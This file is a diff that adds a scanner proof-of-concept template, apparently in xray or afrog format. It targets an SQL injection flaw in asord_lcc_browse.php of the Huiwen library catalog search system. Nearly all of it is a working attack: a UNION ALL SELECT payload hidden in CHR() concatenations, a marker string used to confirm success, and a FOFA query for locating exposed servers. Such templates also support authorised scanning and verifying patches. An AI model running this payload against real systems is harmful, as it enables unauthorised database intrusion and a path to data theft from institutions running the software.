@@ -1,0 +1,20 @@
+id: poc-yaml-huiwen-soft-brs-asord-lcc-browse-php-sqli
+info:
+  name: 汇文软件书目检索系统 asord_lcc_browse.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 汇文软件书目检索系统
+  fofa: app="汇文软件-书目检索系统"
+requests:
+- method: GET
+  path: /asord/asord_lcc_browse.php?cls_no=A%%27+UNION+ALL+SELECT+CHR(113)||CHR(107)||CHR(107)||CHR(112)||CHR(113)||CHR(87)||CHR(71)||CHR(77)||CHR(70)||CHR(73)||CHR(118)||CHR(75)||CHR(68)||CHR(86)||CHR(110)||CHR(85)||CHR(106)||CHR(102)||CHR(117)||CHR(66)||CHR(106)||CHR(102)||CHR(118)||CHR(104)||CHR(122)||CHR(86)||CHR(77)||CHR(68)||CHR(117)||CHR(73)||CHR(105)||CHR(84)||CHR(65)||CHR(101)||CHR(88)||CHR(113)||CHR(113)||CHR(114)||CHR(110)||CHR(66)||CHR(84)||CHR(71)||CHR(102)||CHR(116)||CHR(120)||CHR(113)||CHR(118)||CHR(112)||CHR(120)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+DUAL--+A
+  expression: 'status_code == 200 &&
+
+    contains(body,"asord_marc_no") &&
+
+    contains(body,"qkkpqWGMFIvKDVnUjfuBjfvhzVMDuIiTAeXqqrnBTGftxqvpxq")
+
+    '
+variables: {}
+transport: http
